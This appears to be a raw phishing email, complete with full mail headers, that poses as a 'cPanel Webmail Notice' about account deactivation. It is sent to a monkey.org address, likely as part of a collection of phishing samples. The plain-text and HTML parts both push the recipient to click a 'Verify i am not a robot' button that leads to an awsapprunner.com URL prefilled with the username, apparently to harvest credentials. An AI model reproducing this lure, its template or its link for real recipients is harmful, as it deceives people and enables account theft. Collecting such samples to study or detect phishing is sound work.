@@ -1,0 +1,197 @@
+Return-Path: bounce+9d7877.c14855-jose=monkey.org@mitechps.com
+Delivered-To: jose@monkey.org
+X-FDA: 83187450654.04.F7C4062
+Received: from m42-12.mailgun.net (m42-12.mailgun.net [69.72.42.12])
+	by imf08.b.hostedemail.com (Postfix) with ESMTP id 3E17716000D
+	for <jose@monkey.org>; Wed,  5 Mar 2025 12:38:25 +0000 (UTC)
+Authentication-Results: imf08.b.hostedemail.com;
+	dkim=pass header.d=mitechps.com header.s=smtp header.b="lK/lgqx+";
+	spf=pass (imf08.b.hostedemail.com: domain of
+ "bounce+9d7877.c14855-jose=monkey.org@mitechps.com" designates 69.72.42.12 as
+ permitted sender)
+ smtp.mailfrom="bounce+9d7877.c14855-jose=monkey.org@mitechps.com";
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1741178305;
+	h=from:from:sender:reply-to:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:content-transfer-encoding:in-reply-to:
+	 references:list-id:dkim-signature;
+	bh=tCphUa3cCJ14rrpiyk8ciKmEbPZpWE+AadwXXqhPmQU=;
+	b=KfxBbJHDWkyUHb+9O3252ocBOs7upeq0YfrVdMbNV/duaPKeWNIn8iPibVwo2txZXgAgeE
+	CAPUthdaCuMP4TjRZMdq1d78VM4Rbsz4E74rILC2Qcj6OUYjibDljtJDxSKnLaOnHYdUXq
+	vkRlPfPeSXP4JUGoMo+j1UyZ3YY9P9I=
+ARC-Authentication-Results: i=1;
+	imf08.b.hostedemail.com;
+	dkim=pass header.d=mitechps.com header.s=smtp header.b="lK/lgqx+";
+	spf=pass (imf08.b.hostedemail.com: domain of
+ "bounce+9d7877.c14855-jose=monkey.org@mitechps.com" designates 69.72.42.12 as
+ permitted sender)
+ smtp.mailfrom="bounce+9d7877.c14855-jose=monkey.org@mitechps.com";
+	dmarc=none
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1741178305; a=rsa-sha256;
+	cv=none;
+	b=pN9XdVeuUhyr9yPtvhJ7j01jwrKDMj/EleE1XjP5xp58mehnvhq/XXWuUyeIgx6GVtkGfP
+	iCvN1NVtV4PfhQGOwF6z/5RuuVC07TT8NhwqF1Js2VnK4VE9BFiSFUJsEDgElqrDHWondw
+	Q8LgoU7ESk6O1oW3HNpdNa6twsg+LcQ=
+DKIM-Signature: a=rsa-sha256; v=1; c=relaxed/relaxed; d=mitechps.com;
+ q=dns/txt; s=smtp; t=1741178303; x=1741185503;
+ h=Date: MIME-Version: Content-Type: Subject: Subject: From: From: List-Id:
+ Message-Id: Reply-To: To: To: Sender;
+ bh=tCphUa3cCJ14rrpiyk8ciKmEbPZpWE+AadwXXqhPmQU=;
+ b=lK/lgqx+VRLq5Nw0F1HxnIKYbiMq8WUbssE4Paeqv8qSVgoZuYEyw5Gt00SB60roCIVqy4bl9+uKw/0+AbE12vXULgsgSvBki5T+VnRDoPlPIc5oW2tNdA/g5ZnJrKGK3MEZGFe5BtLA/vOHJDXJlT4L4OvXVo649lMOO2t3JBkipo8OeL3aWRFZV8XuJFANPs8gGAAt97KSZR3FwblHOWUn2HKU9lotI2nNjhQ3q4NsO+PBBnEfnjxRig1K0KuIriToUWGBr8VwluNSPUvtzPEUei6xKqLV2/sI42s0ljzltvC3Ia/qP6v7GXzobOtVHPAoQ98l4dalKcSbjJITOQ==
+X-Mailgun-Sending-Ip: 69.72.42.12
+X-Mailgun-Sending-Ip-Pool-Name: 
+X-Mailgun-Sending-Ip-Pool: 
+X-Mailgun-Sid: WyJjYzVmZCIsImpvc2VAbW9ua2V5Lm9yZyIsImMxNDg1NSJd
+Received: from WIN-BUNS25TD77J (ip25.ip-51-89-12.eu [51.89.12.25]) by
+ 09d112eb7765 with
+ SMTP id 67c845bf88137dd64b610557 (version=TLS1.2,
+ cipher=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256); Wed, 05 Mar 2025 12:38:23 GMT
+X-Mailgun-List-Id: 77599120
+X-Mailgun-List-Address: hyy@mitechps.com
+To: jose@monkey.org
+Reply-To: admin@etaps.org.uk
+Message-Id: <20250305123823.1.b'2A01B028CBA644A5'@etaps.org.uk>
+List-Id: <hyy.mitechps.com>
+From: "cPanel Webmail Notice" <admin@etaps.org.uk>
+Subject: Action Required: Notice of Email Deactivation
+Content-Type: multipart/alternative;
+ boundary="xPUOfN05s=_Q7lRB7T74EgPm161yOXSAmC"
+MIME-Version: 1.0
+Date: Wed, 5 Mar 2025 04:35:53 -0800
+X-Rspamd-Server: rspam07
+X-Rspamd-Queue-Id: 3E17716000D
+X-Stat-Signature: b4n56y8d934wnowbq6ab36isx3wr8rwk
+X-Spam-Status: No, score=1.04
+X-Rspam-User: 
+X-HE-Tag: 1741178305-881675
+X-HE-Meta: 
+ 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
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 82
+
+This is a multi-part message in MIME format
+
+--xPUOfN05s=_Q7lRB7T74EgPm161yOXSAmC
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+
+=C2=A0
+
+=C2=A0
+
+Update
+ Notice
+
+Due to recent changes in the=C2=A0cPanel Webmail
+ Server=C2=A0some dormant account will be permanetly
+ deleted.In order to keep your email active on
+ the=C2=A0jose@monkey.org=C2=A0server we strongly
+ recommend that you verify you are not a
+ rebot.
+
+?
+
+This email and any files transmitted
+ with it are confidential and intended solely for the use of the
+ individual or entity to whom they are addressed. If you have
+ received this email in error please notify=C2=A0
+support@webmail.com https://3utdcat3bm.us-east-1.awsapprunner.com/?username=
+=3Djose@monkey.org
+
+--xPUOfN05s=_Q7lRB7T74EgPm161yOXSAmC
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+
+<html><head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-8859-=
+1">
+ <title>Action Required: Notice of Email Deactivation</title>
+</head>
+ <body><table style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, san=
+s-serif; WIDTH: 500px; BORDER-COLLAPSE: collapse; BACKGROUND-COLOR: rgb(255=
+,255,255)" cellSpacing=3D0 cellPadding=3D0 width=3D500 align=3Dcenter borde=
+r=3D0><tbody style=3D"BOX-SIZING: border-box"> <TR style=3D"BOX-SIZING: bor=
+der-box"> <TD style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; BORD=
+ER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: top; BORDER-BOTTOM-WIDTH: 0px; PADDING=
+-BOTTOM: 5px; PADDING-TOP: 5px; MARGIN: 0px; BORDER-TOP-WIDTH: 0px" width=
+=3D"100%"><table style=3D"BORDER-COLLAPSE: collapse" cellSpacing=3D0 cellPa=
+dding=3D0 width=3D"100%" border=3D0><tbody style=3D"BOX-SIZING: border-box"=
+> <TR style=3D"BOX-SIZING: border-box"> <TD style=3D"BOX-SIZING: border-box=
+; WIDTH: 500px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px"> <DIV s=
+tyle=3D"BOX-SIZING: border-box; LINE-HEIGHT: 10px" align=3Dcenter><IMG styl=
+e=3D"BORDER-TOP-STYLE: none; BOX-SIZING: border-box; BORDER-LEFT-STYLE: non=
+e; VERTICAL-ALIGN: middle; BORDER-BOTTOM-STYLE: none; BORDER-RIGHT-STYLE: n=
+one" border=3D0 src=3D"https://webmail.cocoda.or.tz/cPanel_magic_revision_1=
+677704259/unprotected/cpanel/images/webmail-logo.svg" width=3D225 height=3D=
+37></DIV></TD></TR></TABLE><table style=3D"BORDER-COLLAPSE: collapse" cellS=
+pacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0><tbody style=3D"BOX-SI=
+ZING: border-box"> <TR style=3D"BOX-SIZING: border-box"> <TD style=3D"BOX-S=
+IZING: border-box; WIDTH: 500px; TEXT-ALIGN: center; PADDING-TOP: 25px; MAR=
+GIN: 0px">&nbsp;</TD></TR></TABLE><table style=3D"BORDER-COLLAPSE: collapse=
+" cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0><tbody style=3D=
+"BOX-SIZING: border-box"> <TR style=3D"BOX-SIZING: border-box"> <TD style=
+=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 10px; PADDING-TOP: 35px; PADDIN=
+G-LEFT: 10px; MARGIN: 0px; PADDING-RIGHT: 10px"> <DIV style=3D"BOX-SIZING: =
+border-box; FONT-FAMILY: sans-serif"> <H4 style=3D"BOX-SIZING: border-box; =
+MARGIN-TOP: 0px; FONT-WEIGHT: 500; LINE-HEIGHT: 1.2">&nbsp;</H4> <H3 style=
+=3D"BOX-SIZING: border-box; FONT-SIZE: 1.25em; MARGIN-TOP: 0px; LINE-HEIGHT=
+: 1.2">Update Notice</H3>Due to recent changes in the&nbsp;<STRONG><FONT st=
+yle=3D"BOX-SIZING: border-box" color=3D#d96c00>cPanel Webmail Server</FONT>=
+</STRONG>&nbsp;some dormant account will be permanetly deleted.<BR style=3D=
+"BOX-SIZING: border-box"><BR style=3D"BOX-SIZING: border-box">In order to k=
+eep your email active on the&nbsp;<FONT style=3D"BOX-SIZING: border-box" co=
+lor=3D#0080ff>jose@monkey.org</FONT>&nbsp;server we strongly recommend that=
+ you verify you are not a rebot.</DIV></TD></TR></TABLE><table style=3D"BOR=
+DER-COLLAPSE: collapse" cellSpacing=3D0 cellPadding=3D0 width=3D"100%" bord=
+er=3D0><tbody style=3D"BOX-SIZING: border-box"> <TR style=3D"BOX-SIZING: bo=
+rder-box"> <TD style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 10px; TEXT-=
+ALIGN: center; PADDING-TOP: 35px; PADDING-LEFT: 10px; MARGIN: 0px; PADDING-=
+RIGHT: 10px"> <DIV style=3D"BOX-SIZING: border-box" align=3Dcenter> <DIV st=
+yle=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(236,87,28) 1px solid; FONT-F=
+AMILY: Arial, 'Helvetica Neue', Helvetica, sans-serif; BORDER-RIGHT: rgb(23=
+6,87,28) 1px solid; WIDTH: auto; BORDER-BOTTOM: rgb(236,87,28) 1px solid; C=
+OLOR: rgb(255,255,255); PADDING-BOTTOM: 5px; PADDING-TOP: 5px; BORDER-LEFT:=
+ rgb(236,87,28) 1px solid; BACKGROUND-COLOR: rgb(236,87,28)"><A style=3D"BO=
+X-SIZING: border-box; FONT-SIZE: 16px; COLOR: rgb(255,255,255); PADDING-LEF=
+T: 20px; PADDING-RIGHT: 20px; BACKGROUND-COLOR: transparent; text-decoratio=
+n-line: none" href=3D"https://3utdcat3bm.us-east-1.awsapprunner.com/?userna=
+me=3Djose@monkey.org" rel=3Dnoreferrer target=3D_blank>Verify i am not a ro=
+bot</A></DIV></DIV></TD></TR></TABLE><table style=3D"BORDER-COLLAPSE: colla=
+pse" cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0><tbody style=
+=3D"BOX-SIZING: border-box"> <TR style=3D"BOX-SIZING: border-box"> <TD styl=
+e=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 10px; PADDING-TOP: 35px; PADDI=
+NG-LEFT: 10px; MARGIN: 0px; PADDING-RIGHT: 10px"> <DIV style=3D"BOX-SIZING:=
+ border-box" align=3Dcenter><table style=3D"BORDER-COLLAPSE: collapse" cell=
+Spacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0><tbody style=3D"BOX-S=
+IZING: border-box"> <TR style=3D"BOX-SIZING: border-box"> <TD style=3D"BOX-=
+SIZING: border-box; FONT-SIZE: 1px; BORDER-TOP: rgb(187,187,187) 1px solid;=
+ MARGIN: 0px; LINE-HEIGHT: 1px">&#8202;</TD></TR></TABLE></DIV></TD></TR></=
+TABLE><table style=3D"BORDER-COLLAPSE: collapse" cellSpacing=3D0 cellPaddin=
+g=3D10 width=3D"100%" border=3D0><tbody style=3D"BOX-SIZING: border-box"> <=
+TR style=3D"BOX-SIZING: border-box"> <TD style=3D"BOX-SIZING: border-box; M=
+ARGIN: 0px"> <DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: sans-serif"=
+> <DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Arial=
+, 'Helvetica Neue', Helvetica, sans-serif; COLOR: rgb(85,85,85); LINE-HEIGH=
+T: 1.2"> <P style=3D"BOX-SIZING: border-box; MARGIN: 0px"><SPAN style=3D"BO=
+X-SIZING: border-box; FONT-SIZE: 10px"><EM style=3D"BOX-SIZING: border-box"=
+>This email and any files transmitted with it are confidential and intended=
+ solely for the use of the individual or entity to whom they are addressed.=
+ If you have received this email in error please notify&nbsp;<A style=3D"BO=
+X-SIZING: border-box; COLOR: rgb(17,85,204); BACKGROUND-COLOR: transparent;=
+ text-decoration-line: none" href=3D"mailto:support@webmail.com" rel=3Dnore=
+ferrer>support@webmail.com</A></EM></SPAN></P></DIV></DIV></TD></TR></TABLE=
+></TD></TR></TABLE></body>
+</html>
+
+--xPUOfN05s=_Q7lRB7T74EgPm161yOXSAmC--
+
+
